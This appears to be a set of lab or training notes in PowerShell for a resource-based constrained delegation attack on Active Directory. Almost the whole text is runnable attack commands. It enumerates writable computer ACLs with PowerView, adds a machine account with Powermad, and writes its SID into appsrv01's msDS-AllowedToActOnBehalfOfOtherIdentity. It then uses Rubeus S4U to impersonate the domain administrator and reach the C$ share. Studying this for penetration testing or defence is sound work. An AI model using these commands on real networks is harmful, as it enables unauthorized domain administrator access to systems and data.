#This specific vector starts by compromising a domain account that has the GenericWrite, GenericAll, WriteProperty, or WriteDACL access right on a computer account object.

#In order to get the concerned computer account, we'll reuse our enumeration technique from the prior sections but replace 
#Get-DomainUser with Get-DomainComputer to target computer accounts instead 

Get-DomainComputer | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}

#In the current scenario, the enumeration reveals that the dave user has GenericWrite to appsrv01

#Since we have GenericWrite on appsrv01, we can update any non-protected property on that object, 
#including msDS-AllowedToActOnBehalfOfOtherIdentity and add the SID of a different computer.

#Once a SID is added, we will act in the context of that computer account and we can execute the S4U2Self and S4U2Proxy extensions 
#to obtain a TGS for appsrv01. To do this, we either have to obtain the password hash of a computer account or simply create 
#a new computer account object with a selected password.

#By default, any authenticated user can add up to ten computer accounts to the domain and they will have SPNs set automatically. This value is present in the ms-DS-MachineAccountQuota property in the Active Directory domain object.

#We can enumerate ms-DS-MachineAccountQuota with the PowerView Get-DomainObject method:

Get-DomainObject -Identity prod -Properties ms-DS-MachineAccountQuota

#We will use Powermad to create a new machine account specifying the target computer account name (-MachineAccount) and the password (-Password). The password must be supplied as a SecureString, which we can generate with ConvertTo-SecureString

. .\powermad.ps1
New-MachineAccount -MachineAccount myComputer -Password $(ConvertTo-SecureString 'h4x' -AsPlainText -Force)
Get-DomainComputer -Identity myComputer

#We must convert the SID of our newly-created computer object to the correct format in order to proceed with the attack.
$sid =Get-DomainComputer -Identity myComputer -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($sid))"

#With the SecurityDescriptor object created, we must convert it into a byte array to match the format for the msDS-AllowedToActOnBehalfOfOtherIdentity property
$SDbytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDbytes,0)

#we can use Get-DomainComputer to obtain a handle to the computer object for appsrv01 and then pipe that into Set-DomainObject, which can update properties by specifying them with -Set options:
Get-DomainComputer -Identity appsrv01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Now we can begin our attack in an attempt to compromise appsrv01. We'll start by obtaining the hash of the computer account password with Rubeus:

.\Rubeus.exe hash /password:h4x
.\Rubeus.exe s4u /user:myComputer$ /rc4:AA6EAFB522589934A6E5CE92C6438221 /impersonateuser:administrator /msdsspn:CIFS/appsrv01.prod.corp1.com /ptt

#To check the success of this attack, we'll first dump any loaded Kerberos tickets with klist:
klist

#Now that we have a TGS for the CIFS service on appsrv01 as administrator, we can interact with file services on appsrv01 in the context of the administrator domain admin user:
dir \\appsrv01.prod.corp1.com\c$